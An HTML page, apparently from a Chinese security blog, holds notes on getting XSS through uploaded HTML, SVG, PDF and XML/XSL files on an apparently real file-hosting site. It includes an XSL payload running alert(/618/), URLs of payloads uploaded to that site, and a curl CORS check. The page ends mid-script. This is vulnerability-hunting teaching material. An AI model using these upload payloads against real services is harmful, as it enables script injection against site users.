@@ -1,0 +1,744 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/24.png">
+  <link rel="icon" href="/img/24.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Jimi">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="师傅笔记： crossdomain.xml是adobe搞的，为了让flash跨域访问文件(跨域资源请求文件) http:&#x2F;&#x2F;220.172.165.183:8083&#x2F;crossdomain.xml 数据包头部：Origin:https:&#x2F;&#x2F;baidu.com 响应包：Access-Control-Allow-0rigin: CURL查看：curl 域名 -H “Origin: https:&#x2F;&#x2F;ba">
+<meta property="og:type" content="article">
+<meta property="og:title" content="各种类型上传文件打出XSS">
+<meta property="og:url" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/index.html">
+<meta property="og:site_name" content="Jimi&#39;s blog">
+<meta property="og:description" content="师傅笔记： crossdomain.xml是adobe搞的，为了让flash跨域访问文件(跨域资源请求文件) http:&#x2F;&#x2F;220.172.165.183:8083&#x2F;crossdomain.xml 数据包头部：Origin:https:&#x2F;&#x2F;baidu.com 响应包：Access-Control-Allow-0rigin: CURL查看：curl 域名 -H “Origin: https:&#x2F;&#x2F;ba">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/1-39168a3f.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/2-0891836b.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/3-052c75a5.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/4-5a29ed93.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/5-9cc7a9b0.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/6-e3c31d4a.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/7-9de7943c.png">
+<meta property="og:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/8-83b1d3f7.png">
+<meta property="article:published_time" content="2024-07-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-08T06:49:04.586Z">
+<meta property="article:author" content="Jimi">
+<meta property="article:tag" content="XSS">
+<meta property="article:tag" content="文件上传">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://jimi-lab.github.io/2024/07/01/%E5%90%84%E7%A7%8D%E7%B1%BB%E5%9E%8B%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E6%89%93%E5%87%BAXSS/img/1-39168a3f.png">
+  
+  
+  
+  <title>各种类型上传文件打出XSS - Jimi&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/background_video.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"jimi-lab.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Jimi</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/trees.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="各种类型上传文件打出XSS"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-07-01 08:00" pubdate>
+          2024年7月1日 早上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          325 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          3 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">各种类型上传文件打出XSS</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong><font style="color:#c00000;background-color:#b8cce4;">师傅笔记：</font></strong></p>
+<p><strong>crossdomain.xml</strong>是adobe搞的，为了让flash跨域访问文件(跨域资源请求文件)</p>
+<p><a target="_blank" rel="noopener" href="http://220.172.165.183:8083/crossdomain.xml">http://220.172.165.183:8083/crossdomain.xml</a></p>
+<p>数据包头部：Origin:<a target="_blank" rel="noopener" href="https://baidu.com/">https://baidu.com</a></p>
+<p>响应包：Access-Control-Allow-0rigin:</p>
+<p>CURL查看：curl 域名 -H “Origin: <a target="_blank" rel="noopener" href="https://baidu.com/">https://baidu.com</a>“ -I</p>
+<p>上传xml文件必须CORS允许所有域 CORS 跨域资源请求(允许我们网站加载其他网页代码)</p>
+<p><a target="_blank" rel="noopener" href="https://res2m.age06.com/">https://res2m.age06.com/</a></p>
+<p>html-XSS <a target="_blank" rel="noopener" href="https://res2m.age06.com/File/1/shangxin.html">https://res2m.age06.com/File/1/shangxin.html</a></p>
+<p>svg-XSS <a target="_blank" rel="noopener" href="https://res2m.age06.com/File/1/shangxin.svg">https://res2m.age06.com/File/1/shangxin.svg</a></p>
+<p>pdf-XSS <a target="_blank" rel="noopener" href="https://res2m.age06.com/File/1/shangxin.pdf">https://res2m.age06.com/File/1/shangxin.pdf</a></p>
+<p>xml</p>
+<p>xml它需要上传2个文件 首先上传第一个xml文件(url地址我们首先拿到) 在上传第二个xml文件</p>
+<p>xml1：<a target="_blank" rel="noopener" href="https://res2m.age06.com/File/1/shangxin1.xml">https://res2m.age06.com/File/1/shangxin1.xml</a></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;iso-8859-1&quot;</span>?&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-regexp">/618/</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:template</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+<p>xml2:</p>
+<?xml version="1.0" encoding="iso-8859-1"?>
+
+<?xml-stylesheet type="text/xsl" href="https://res2m.age06.com/File/1/shangxin1.xml"?>
+
+<p><test></test></p>
+<p><strong><font style="color:#c00000;background-color:#b8cce4;">个人笔记：</font></strong></p>
+<p>一：pdf打出xss</p>
+<!-- 这是一张图片，ocr 内容为：14:01 O 门 市服入口 只,注册/豆录 三乘单 购买VIP 新建文档迅挂PDF润设器 工具(M) 出口W) 注释(C) 高级百找(S) 农单(R) 文档(D) 视图(V) 文件 编联(O ()浙至 日保存(S) 糊脂(U) 缩放工具 高亮 传贴 匹起页面 扫描 距离 124.48% 快照 国文木柜 张 波大 送时针(W) 前一视图 美贴板 率做(R) 册除线 匹配宽度 新迁 添加附件, 手形工具选取工具编辑注释工具 编辑内容 添加 编辑衣单 实际大小 打开(O).... 线条 目标注, 10 缩小 )声音 面积 顺时针(C) 出租 匹配可见 下划纷统 吉找 20 句右旋转 向左旋转 页面保性 缩略图 干燥加动作:运行JAVASCRIPT 页码 1 标签1 编码 JAVA SCRIPT: 宽度 210MM APP.ALERT(618) 高原297MM 焦量考值. TAB 顺序 未指定 动作 打开页面<空白> 关闭页面<空白> -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/1-39168a3f.png"></p>
+<!-- 这是一张图片，ocr 内容为：打开 此电脑>DESKTOP  上传文件之XSS 个 新郊文件夹 组织 类型 修改日期 大小 名称 快速访问 SHANGXIN.HTML CHROME HTML D.... 202403-20 16:14 1 KB WPS云盘 SHANGXIN.PDF 202403-22 14:01 MICROSOFT EDGE... 25KB 2023-12-2417:11 SHANGXIN.SVG MICROSOFT EDGE... 1 KB ONEDRIVE-PERSONA SHANGXIN1.XML 1 KB 202403-22 0:46 MICROSOLT EDGE... 此电脑 1 KB SHANGXIN2.XML MICROSOFT EDGE... 202403-22  0:46 3D 对象 1 KB 202403-2213:59 TXT 文件 上传文件打出XSS.LXT DESKTOP 视频 三图片 在网站上传PDF文件 同文档 -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/2-0891836b.png"></p>
+<!-- 这是一张图片，ocr 内容为：食 RES2M.AGE06.COM JS 必应 口日活力公 口知识 口沙箱 口 打点 CTF 口 源调库 导入 河南省技术船手 设置 POE 网盘 主页 下载SDK API 提示 网盘 OWNERLD W:(0)/U0026H(1),LD":035A0519-4DD0-4021-BD9D- D9B7BBOAOC8D,,OWNERLD,,1",NAME",SHANGXIN PDR,PATH",PATH",CREATETIME",2024/3/22 14:02:23",TYPE",RSOFT PAN.DOMAIN.FILENODE",TAGS,NULL,"ERRORCODE",O,"MESSAGE",NULL 当前路径:1 返间上一级 选择文件 SHANGXIN.PDL 确定 OK 文件夹名称: 文件夹LD: 根目录 OWNERLD: PATH: 访问地址 类型 名称 LD 文件夹 B840B319- AND C1D5-4214- 9F69- 1EFL20419E55 文件夹 63E25378 "AND FFA8-4DB8. 8396- D4E4796F7947 6E8B9C33. 'AND'M -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/3-052c75a5.png"></p>
+<p>二：XML格式打出XSS</p>
+<p>1.先上传第一个xml1代码文件</p>
+<!-- 这是一张图片，ocr 内容为：口一直 个 四 RES2M.AGE06.COM 子四 JS 05 必应 应用 设置 口 导入 口 打点 口日活力公 口 通洞库 O SRC 口知识 O CTF 口沙箱 河南省技术能手 POE 网盘 API 主页 下载SDK 提示 网盘 (RESULT . OWNERLD ,DOWNLOADURL.. HTTPS//RES2M.AGEO6.COM/DOWNLOAD/1/SHENGXIN1.XM [SIZE":250,HOSE:  HTTPS://RES2M.AGE06.COM/, URL": THTTPS://RES2M.AGE06.COM/FLLE/1/SHANQXIN1.XN W-(0)/U0026H-(1),1D:"8306E0EB-2BB3-461E-A55A- 88934615658E",OWNERLD."NAME",SHANGXNGXNI.XMF,"PATH."R,,CREATE TIME.,2024/3R22 14:05:38",TYPE""RSOFT PAN.DOMAIN.FILENODE""TAGS"NULL)"ERRORCODE":0,MESSAGE",NULL) 当前路径:/ 返网上一级 选择文件 SHANGXIN1.XML 确定 OK 文件夹名称: 文件夹LD: 根目景 得到XML1的地址 PATH: OWNERLD: 类型 名称 AND B840B319- -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/4-5a29ed93.png"></p>
+<p>2.将xml1的地址放到xml2的href中</p>
+<p>上传xml2</p>
+<!-- 这是一张图片，ocr 内容为：O RES2M.AQE06.COM/FILC/1/618 网盈 220.172.165.183:80 K 门 中国日 - RES2M.AGE06.COM JS 必应 口知识 应用 导入 设置 CTF 沙箱 打点 STC 日常力公 吊洞库 河南省技术船手 网盘 主页 下载SDK API 提示 网盘 "RESULT OWNERLD W(0)/U0026H-(1)*1D:*848120D4-078F-4552-B656- 3/1999211135,,OWNERLD",1",NAME".XML",XML",PATH",,PATETIME":"22 14:07:25"TYPE",RSOFL.PAN.DOMALN.FLENODE",TAGS"NULL)"ERRORCODE","MESSAGE"NULLY 当前路径: 返回上一级 选择文件6182.XML 确定 OK 得到XML2的地址 文件夹名称: 文件夹ID: 根目录 PATH: OWNERLD: -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/5-9cc7a9b0.png"></p>
+<p>3.上传xml文件必须CORS允许所有域 CORS 跨域资源请求(允许我们网站加载其他网页代码)</p>
+<p>命令：curl 域名 -H “Origin: <a target="_blank" rel="noopener" href="https://baidu.com/">https://baidu.com</a>“ -I</p>
+<p>查看CORS 跨域资源请求</p>
+<!-- 这是一张图片，ocr 内容为：UBUNTU-VMWARE WORKSTATION 母 文件(D据锁(D) 介主页 UBUNTU 回终端 活动 3月22日14:10 HACKER@UBUNTU-DRONE:~ HACKERQUBUNTU-DRONE:-S CURT HTTPS://RESZM.AGEO6.COM/-H "ORIGIN:HTTPS://BAIDU.CON" HTTP/1.1  200   CACHE-CONTROL:PRIVATE CONTENT-LENGTH;11924 PE:TEXT/HTML;CHARSETUTF-8 CONTENT-TYPE: SERVER:MICROSOFT-IIS/8.5 X-ASPNETMVC-VERSION; 5.2 X-ASPNET-VERSTON:4.0.30319 X-POWERED-BY:ASP.NET ARIQ DATE:FRI, 22  MAR 2024 09:54 GMT SET-COAKT: UAZBPORN3LPIDWAUSENGTRSI.  2924 06:90 CHT;  EXPRAT-2924 0E: EXPJRESEERT,  2924 00 CHT; PA5 HACKER@UBUNTU-DRONE:S -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/6-e3c31d4a.png"></p>
+<p>观察数据包，</p>
+<!-- 这是一张图片，ocr 内容为：6JUNTU-DRONE:-S CURL HTTPS://RES2M.AGE06.COM/ -H "ORIGIN:HTTPS://BAIDU.COM 1390X363 HTTP/1.1 200 OK CACHE-CONTROL:PRIVATE CONTENT-LENGTH;11924 CONTENT-TYPE:TEXT/HTML; CHARSETUTF-8 SERVER:MICROSOFT-IIS/8.5 X-ASPNETMVC-VERSION:5.2 K-ASPNET-VERSION:4.0.30319 X-POWERED-BY:ASP.NET DATE:FRI, 22 MAR 2034 06:09:54 GMT RETRCUUKE;  UZBRD3R3EFTISXJOSOUST,  22   2824 05;  EXPLYEST ACCESS-CONTROL-ALLOW-ORIGIH:* 如果有这个语句,呢么XML可执行 HACKERDUBUNTU-DRONE:~S -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/7-9de7943c.png"></p>
+<!-- 这是一张图片，ocr 内容为：3月22日14:10 活动 HACKER@UBUNTU-DRONE;~ HACKERQUBUNTU-DRONE:-S CURL HTTPS://RES2N.AGEO6.CON/-H "ORIGIN:HTTPS://BAIDU.CON" HTTP/1.1 200 OK CACHE-CONTROL: PRIVATE CONTENT-LENGTH;11924 CONTENT-TYPE:TEXT/HTML; CHARSETUTF-8 SERVER:MIEROSOFT-IIS/8.5 X-ASPNETMVC-VERSION: 5.2 X-ASPNET-VERSTON:4.0.30319 X-POWERED-BY:ASP.NET Q DATE:FRI, 22  MAR  06:06:09:54 GMT SET-COOKIE:UQZBPD3N3IPIDWJU9BM4IVIUQF92 WG9C301WB-V1FEXJESOPEK:EXDIRESFRI.22-MAR-2024 06:40:00 GMT; PA ACCESS-CONTROL-ALLOW-ORIGIN:HTTPS://RES2M.AGE06.COM 这个也可以打出XML HACKER@UBUNTU-DRONE:`$ -->
+<p><img src="/2024/07/01/各种类型上传文件打出XSS/img/8-83b1d3f7.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" class="category-chain-item">漏洞挖掘</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/XSS/" class="print-no-link">#XSS</a>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" class="print-no-link">#文件上传</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>各种类型上传文件打出XSS</div>
+      <div>https://jimi-lab.github.io/2024/07/01/各种类型上传文件打出XSS/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Jimi</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年7月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/07/01/%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="个人信息搜集">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">个人信息搜集</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/07/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E4%B8%8A%E4%BC%A0cs%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="文件上传之上传cs服务器">
+                        <span class="hidden-mobile">文件上传之上传cs服务器</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments">
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Jimi-Lab/Jimi-Lab.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      
+<a href="https://github.com/Jimi-Lab" target="_blank" rel="nofollow noopener"><span>@Jimi.github</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
